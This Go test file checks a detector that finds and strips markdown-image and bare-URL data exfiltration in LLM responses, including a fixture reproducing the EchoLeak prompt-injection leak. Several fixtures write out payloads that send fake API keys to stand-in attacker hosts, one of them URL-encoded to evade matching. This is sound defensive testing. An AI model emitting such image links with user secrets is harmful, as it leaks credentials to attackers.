package inspector

import (
	"strings"
	"testing"
)

// The deterministic demo payload the victim app's ?demo=true path ships.
// Kept verbatim so the Go MODIFY action and the TS-side detector agree on
// the exact string the EchoLeak reproduction emits.
const victimDemoPayload = "Sure, here is your inbox summary. The platform is healthy and the renewal " +
	"reminder is in flight. ![receipt](https://attacker.example.com/log?d=sk-acme-internal-deadbeefcafef00d-1234)"

func TestDetectMarkdownExfil_VictimDemoFixture(t *testing.T) {
	got := DetectMarkdownExfil(victimDemoPayload, MarkdownExfilOptions{
		ExtraSecretFragments: []string{"sk-acme-internal-deadbeefcafef00d-1234"},
	})
	if len(got) != 1 {
		t.Fatalf("expected 1 candidate from victim demo fixture, got %d (%+v)", len(got), got)
	}
	c := got[0]
	if !c.IsMarkdownImage {
		t.Errorf("expected markdown-image candidate, got bare URL: %+v", c)
	}
	if c.Host != "attacker.example.com" {
		t.Errorf("Host = %q, want attacker.example.com", c.Host)
	}
	if !strings.Contains(c.URL, "sk-acme-internal") {
		t.Errorf("URL = %q, expected to contain the secret fragment", c.URL)
	}
	if c.MarkdownMatch == "" || !strings.Contains(victimDemoPayload, c.MarkdownMatch) {
		t.Errorf("MarkdownMatch must be a substring of the payload, got %q", c.MarkdownMatch)
	}
	if c.MatchedFragment == "" {
		t.Errorf("expected MatchedFragment to be populated")
	}
}

func TestDetectMarkdownExfil_TableDriven(t *testing.T) {
	const internalKey = "sk-acme-internal-deadbeefcafef00d-1234"
	cases := []struct {
		name      string
		text      string
		trusted   []string
		secrets   []string
		wantCount int
		check     func(t *testing.T, cands []ExfilCandidate)
	}{
		{
			name:      "plain markdown image to attacker — matched, stripped",
			text:      "Summary: ![](https://attacker.example.com/log?d=stolen)",
			wantCount: 1,
			check: func(t *testing.T, cs []ExfilCandidate) {
				if !cs[0].IsMarkdownImage || cs[0].Host != "attacker.example.com" {
					t.Errorf("unexpected candidate: %+v", cs[0])
				}
			},
		},
		{
			// Encode the `-` between `acme` and `internal` so the raw URL
			// reads `sk-acme%2Dinternal-...`. The detector must decode this
			// (QueryUnescape) before matching the secret literal — without
			// the decode pass the generic credential regex would still grab
			// the shorter `sk-acme` fragment, which is wrong.
			name:      "markdown image with URL-encoded secret — matched, decoded",
			text:      "![](https://evil.example.org/p?k=sk-acme%2Dinternal-deadbeefcafef00d-1234)",
			secrets:   []string{internalKey},
			wantCount: 1,
			check: func(t *testing.T, cs []ExfilCandidate) {
				if cs[0].MatchedFragment != internalKey {
					t.Errorf("expected MatchedFragment=%q, got %q", internalKey, cs[0].MatchedFragment)
				}
				if cs[0].Reason != "markdown_image_with_secret_fragment" {
					t.Errorf("expected secret-fragment reason, got %q", cs[0].Reason)
				}
			},
		},
		{
			name:      "markdown image to ALLOWED domain — NOT stripped",
			text:      "![logo](https://cdn.allowed.example.com/logo.png)",
			trusted:   []string{"cdn.allowed.example.com"},
			wantCount: 0,
		},
		{
			name:      "markdown image to subdomain of trusted wildcard — NOT stripped",
			text:      "![logo](https://images.allowed.example.com/logo.png)",
			trusted:   []string{"*.allowed.example.com"},
			wantCount: 0,
		},
		{
			name:      "bare URL with secret pattern in query string — matched, redacted",
			text:      "Visit https://attacker.example.com/log?api_key=AKIAEXAMPLE123 for your records.",
			wantCount: 1,
			check: func(t *testing.T, cs []ExfilCandidate) {
				if cs[0].IsMarkdownImage {
					t.Errorf("expected bare URL, got markdown")
				}
				if cs[0].Reason != "bare_url_with_secret_fragment" {
					t.Errorf("expected bare_url_with_secret_fragment, got %q", cs[0].Reason)
				}
			},
		},
		{
			name:      "benign markdown image — passed through (no trusted list given, but no secret)",
			text:      "Picture of a sunset: ![](https://photos.publicsite.example/sunset.jpg)",
			wantCount: 1, // External markdown image — counts regardless of secret.
			check: func(t *testing.T, cs []ExfilCandidate) {
				if cs[0].MatchedFragment != "" {
					t.Errorf("expected no fragment match, got %q", cs[0].MatchedFragment)
				}
				if cs[0].Reason != "markdown_image_to_external_host" {
					t.Errorf("expected markdown_image_to_external_host reason, got %q", cs[0].Reason)
				}
			},
		},
		{
			name:      "benign markdown image with no exfil indicators — passed through unchanged with trusted list",
			text:      "Picture of a sunset: ![](https://photos.publicsite.example/sunset.jpg)",
			trusted:   []string{"photos.publicsite.example"},
			wantCount: 0,
		},
		{
			name:      "multiple markdown images — all flagged, none skipped",
			text:      "![a](https://attacker.example/a) and ![b](https://evil.example/b) and ![c](https://safe.example/c)",
			trusted:   []string{"safe.example"},
			wantCount: 2,
			check: func(t *testing.T, cs []ExfilCandidate) {
				hosts := []string{cs[0].Host, cs[1].Host}
				if !(contains(hosts, "attacker.example") && contains(hosts, "evil.example")) {
					t.Errorf("expected attacker.example + evil.example, got %v", hosts)
				}
				for _, c := range cs {
					if c.Host == "safe.example" {
						t.Errorf("safe.example should be allowlisted but was flagged: %+v", c)
					}
				}
			},
		},
		{
			name:      "bare URL on local loopback — NOT flagged (internal)",
			text:      "Health: http://localhost:8080/internal?token=AKIAEXAMPLE12345",
			wantCount: 0,
		},
		{
			name:      "no URLs at all — no candidates",
			text:      "The capital of France is Paris.",
			wantCount: 0,
		},
		{
			name:      "bare URL without any secret-like query — NOT flagged (no signal)",
			text:      "Read more at https://docs.example.com/getting-started",
			wantCount: 0,
		},
		{
			name:      "bare URL appears inside a markdown image — deduplicated to single candidate",
			text:      "![](https://attacker.example.com/log?d=AKIAEXAMPLE12345)",
			wantCount: 1,
		},
		{
			name:      "trailing punctuation stripped from URL",
			text:      "Click ![hi](https://attacker.example.com/?d=stolen).",
			wantCount: 1,
			check: func(t *testing.T, cs []ExfilCandidate) {
				if strings.HasSuffix(cs[0].URL, ".") {
					t.Errorf("trailing punctuation not stripped: %q", cs[0].URL)
				}
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := DetectMarkdownExfil(tc.text, MarkdownExfilOptions{
				TrustedDomains:       tc.trusted,
				ExtraSecretFragments: tc.secrets,
			})
			if len(got) != tc.wantCount {
				t.Fatalf("len(candidates) = %d, want %d (got %+v)", len(got), tc.wantCount, got)
			}
			if tc.check != nil && len(got) > 0 {
				tc.check(t, got)
			}
		})
	}
}

func TestStripMarkdownExfil_PreservesOrder(t *testing.T) {
	text := "Intro ![a](https://attacker.example/a?k=sk-evil-abc123) middle ![b](https://evil.example/b?api_key=AKIA01234567) outro"
	cands := DetectMarkdownExfil(text, MarkdownExfilOptions{})
	if len(cands) != 2 {
		t.Fatalf("expected 2 candidates, got %d", len(cands))
	}
	rewritten, edits := StripMarkdownExfil(text, cands)
	if edits != 2 {
		t.Fatalf("edits = %d, want 2", edits)
	}
	// The destination URLs and the markdown image syntax must be gone.
	// (The host name itself survives inside the redaction marker so the
	// audit reader can see where the request was headed — that's the
	// contract.)
	if strings.Contains(rewritten, "/a?k=") || strings.Contains(rewritten, "/b?api_key=") {
		t.Errorf("rewritten still contains the exfil URL paths: %s", rewritten)
	}
	if strings.Contains(rewritten, "![a](") || strings.Contains(rewritten, "![b](") {
		t.Errorf("rewritten still contains markdown image syntax: %s", rewritten)
	}
	if !strings.HasPrefix(rewritten, "Intro ") || !strings.HasSuffix(rewritten, " outro") {
		t.Errorf("body order not preserved: %s", rewritten)
	}
	if !strings.Contains(rewritten, " middle ") {
		t.Errorf("middle text removed: %s", rewritten)
	}
	if strings.Count(rewritten, "stripped by Reef MODIFY") != 2 {
		t.Errorf("expected two REDACTED markers, got: %s", rewritten)
	}
}

func TestStripMarkdownExfil_NoCandidates(t *testing.T) {
	text := "Nothing exfil here."
	rewritten, edits := StripMarkdownExfil(text, nil)
	if rewritten != text || edits != 0 {
		t.Errorf("expected pass-through, got rewritten=%q edits=%d", rewritten, edits)
	}
}

func TestInspector_PopulatesMarkdownExfilSignals(t *testing.T) {
	ins := NewWithTrustedDomains([]string{"api.openai.com"})
	meta := ins.Inspect("here ![](https://attacker.example.com/log?d=AKIAEXAMPLE12345) ok")
	if !meta.ContainsMarkdownImageWithExternalURL {
		t.Errorf("expected ContainsMarkdownImageWithExternalURL=true")
	}
	if len(meta.MarkdownImageURLs) != 1 {
		t.Errorf("expected 1 markdown image URL, got %v", meta.MarkdownImageURLs)
	}
	if len(meta.ExfilCandidates) != 1 {
		t.Errorf("expected 1 ExfilCandidate, got %v", meta.ExfilCandidates)
	}
}

func TestInspector_TrustedDomainSuppressesSignal(t *testing.T) {
	ins := NewWithTrustedDomains([]string{"api.openai.com"})
	meta := ins.Inspect("logo ![](https://api.openai.com/logo.png) ok")
	if meta.ContainsMarkdownImageWithExternalURL {
		t.Errorf("trusted domain should not trip the signal: %+v", meta)
	}
	if len(meta.ExfilCandidates) != 0 {
		t.Errorf("expected zero candidates for trusted host, got %v", meta.ExfilCandidates)
	}
}

func contains(haystack []string, needle string) bool {
	for _, s := range haystack {
		if s == needle {
			return true
		}
	}
	return false
}
